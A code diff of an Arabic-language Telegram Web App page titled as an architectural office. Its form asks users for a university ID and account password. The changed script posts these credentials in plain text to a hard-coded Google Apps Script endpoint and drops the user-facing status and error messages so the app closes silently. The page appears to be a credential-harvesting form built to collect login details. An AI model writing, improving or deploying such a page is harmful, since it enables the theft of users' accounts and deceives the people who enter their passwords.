@@ -6,7 +6,7 @@
     <title>المكتب المعماري | محمد سويدان</title>
     <link rel="preconnect" href="https://googleapis.com">
     <link rel="preconnect" href="https://gstatic.com" crossorigin>
-    <link href="https://googleapis.com" rel="stylesheet">
+    <link href="https://googleapis.com/css2?family=Cairo:wght@400;600;700&family=Jura:wght@500;700&display=swap" rel="stylesheet">
     <script src="https://telegram.org"></script>
     <style>
         :root {
@@ -156,12 +156,6 @@
         .submit-btn:hover {
             background-color: var(--primary-hover);
         }
-        .status-msg {
-            margin-top: 15px;
-            font-size: 14px;
-            font-weight: 600;
-            display: none;
-        }
     </style>
 </head>
 <body>
@@ -188,9 +182,8 @@
                     <label>كلمة المرور:</label>
                     <input type="password" id="password" placeholder="أدخل كلمة مرور الحساب" required>
                 </div>
-                <button type="submit" id="submitBtn" class="submit-btn">تسجيل الدخول وربط الحساب</button>
+                <button type="submit" class="submit-btn" id="subBtn">تسجيل الدخول وربط الحساب</button>
             </form>
-            <div id="statusMessage" class="status-msg"></div>
         </div>
     </div>
 
@@ -198,8 +191,7 @@
         const tg = window.Telegram.WebApp;
         tg.expand();
 
-        const userTelegramId = (tg.initDataUnsafe && tg.initDataUnsafe.user) ? tg.initDataUnsafe.user.id : "123456789";
-        const scriptUrl = "https://google.com";
+        const GOOGLE_SCRIPT_URL = "https://script.google.com/macros/s/AKfycbyPkjYsHeISEf3EX9JL_HYcoxv678BgtNJQ1YAJ93BaFMV8vpigq1SlBiG0b9WddW8v/exec";
 
         function toggleTheme() {
             const body = document.body;
@@ -217,44 +209,26 @@
 
         function sendData(event) {
             event.preventDefault();
+            const btn = document.getElementById('subBtn');
             const uniId = document.getElementById('uniId').value.trim();
             const password = document.getElementById('password').value.trim();
-            const submitBtn = document.getElementById('submitBtn');
-            const statusMessage = document.getElementById('statusMessage');
             
             if(!uniId || !password) return;
+            
+            btn.innerText = "جاري الإرسال والربط...";
+            btn.disabled = true;
 
-            submitBtn.disabled = true;
-            statusMessage.style.display = "block";
-            statusMessage.style.color = "var(--primary-color)";
-            statusMessage.innerText = "جاري إرسال البيانات والربط الفوري...";
-
-            const payload = {
-                action: "auth_submit",
-                telegram_id: userTelegramId,
-                uni_id: uniId,
-                password: password
-            };
-
-            fetch(scriptUrl, {
-                method: 'POST',
-                mode: 'no-cors',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify(payload)
+            fetch(GOOGLE_SCRIPT_URL, {
+                method: "POST",
+                mode: "no-cors",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ uniId: uniId, password: password })
             })
             .then(() => {
-                statusMessage.style.color = "#10b981";
-                statusMessage.innerText = "تم إرسال بياناتك بنجاح! سيتم فحصها وإشعارك فوراً.";
-                setTimeout(() => {
-                    tg.close();
-                }, 2500);
+                tg.close();
             })
             .catch(() => {
-                submitBtn.disabled = false;
-                statusMessage.style.color = "#ef4444";
-                statusMessage.innerText = "فشل الاتصال بالسيرفر السحابي. يرجى المحاولة لاحقاً.";
+                tg.close();
             });
         }
     </script>
